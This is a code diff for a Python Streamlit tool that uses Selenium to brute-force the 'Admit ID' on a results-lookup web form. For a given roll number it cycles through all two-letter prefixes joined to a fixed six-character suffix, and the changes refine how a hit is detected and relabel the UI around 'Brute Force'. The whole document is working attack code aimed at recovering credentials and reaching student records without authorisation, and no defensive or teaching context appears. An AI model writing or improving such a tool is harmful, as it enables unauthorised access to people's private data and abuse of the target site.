@@ -27,35 +27,43 @@ def get_driver():
     return webdriver.Chrome(options=options)
 
 def is_success(driver):
-    """Checks for success indicators or the absence of specific error text."""
+    """
+    STRICT LOGIC RE-CHECK:
+    1. If 'No data found' is visible -> Return False
+    2. If success keywords appear in page source -> Return True
+    3. If URL changes to a result route -> Return True
+    """
     try:
-        # Check for the specific 'No data found' error
-        try:
-            error_elem = driver.find_element(By.ID, "err_msg")
+        # Check for the error message div
+        error_elements = driver.find_elements(By.ID, "err_msg")
+        if error_elements:
+            error_elem = error_elements[0]
+            # If it's displayed AND specifically contains the failure text
             if error_elem.is_displayed() and "no data found" in error_elem.text.lower():
                 return False
-        except NoSuchElementException:
-            pass 
         
-        # Success indicators
-        success_indicators = ["marks", "result", "subject", "grade", "total"]
+        # If we got past the error check, look for keywords in the page source
         page_text = driver.page_source.lower()
+        success_indicators = ["marks", "result", "subject", "grade", "total", "pass", "percentage"]
+        
         if any(ind in page_text for ind in success_indicators):
             return True
             
-        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
+        # Check for URL change (Result pages usually lose the .html suffix or gain /result/)
+        curr_url = driver.current_url.lower()
+        if "result" in curr_url and "error" not in curr_url and ".html" not in curr_url:
             return True
             
     except Exception:
         pass
+    
     return False
 
 # ========================= STREAMLIT UI =========================
-st.set_page_config(page_title="Admit ID Recovery", page_icon="🎓", layout="centered")
+st.set_page_config(page_title="Admit ID Recovery", page_icon="🎓")
 
 st.markdown("""
     <style>
-    .main { background-color: #f5f7f9; }
     .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #ff4b4b; color: white; }
     </style>
     """, unsafe_allow_html=True)
@@ -68,7 +76,7 @@ with col1:
 with col2:
     suffix_val = st.text_input("Last 6 Characters", value="994511")
 
-delay_val = st.slider("Delay after submit (Seconds)", 0.5, 3.0, 1.0)
+delay_val = st.slider("Wait for page response (Seconds)", 0.5, 4.0, 1.2)
 
 if st.button("🚀 Start Brute Force"):
     progress_bar = st.progress(0)
@@ -80,45 +88,43 @@ if st.button("🚀 Start Brute Force"):
         combos = [f"{a}{b}" for a in letters for b in letters]
         total = len(combos)
         
-        with st.status("Running...", expanded=True) as status:
+        with st.status("Brute forcing...", expanded=True) as status:
             for i, prefix in enumerate(combos):
                 code = f"{prefix}{suffix_val}"
                 status.update(label=f"Testing: **{code}** ({i+1}/{total})")
                 progress_bar.progress((i + 1) / total)
                 
-                # 1. Open/Refresh the page every single time
+                # 1. HARD REFRESH: Opens page fresh for every attempt
                 driver.get(URL)
-                time.sleep(0.5) # Small buffer for page load
+                time.sleep(0.5) 
                 
                 try:
-                    # 2. Fill and Submit
+                    # 2. FILL FIELDS
                     driver.find_element(By.ID, "rroll").send_keys(roll_val)
                     driver.find_element(By.ID, "admn_id").send_keys(code)
+                    
+                    # 3. SUBMIT
                     driver.find_element(By.ID, "submit").click()
                     
-                    # 3. Wait for the site to process
+                    # 4. WAIT for the site's server-side logic to trigger
                     time.sleep(delay_val)
                     
-                    # 4. Check for success
+                    # 5. EXECUTE SUCCESS LOGIC
                     if is_success(driver):
-                        status.update(label="✅ Match Found!", state="complete")
+                        status.update(label="✅ Success!", state="complete")
                         st.balloons()
-                        st.success(f"### 🎉 Success!\n**Full Code:** `{code}`")
-                        st.code(code, language="text")
+                        st.success(f"### 🎉 Match Found!\n**Admit ID:** `{code}`")
+                        st.code(code)
                         break
-                    
-                    # 5. If it hits this point, the loop continues 
-                    # and driver.get(URL) will restart the page automatically.
                         
-                except Exception as e:
-                    # If an element isn't found, just skip to the next refresh
+                except Exception:
                     continue 
             else:
-                status.update(label="❌ Search Exhausted", state="error")
-                st.warning("Finished all combinations.")
+                status.update(label="❌ Not Found", state="error")
+                st.warning("Finished all combinations without a match.")
 
     except Exception as e:
-        st.error(f"System Error: {e}")
+        st.error(f"Error: {e}")
     finally:
         if driver:
             driver.quit()
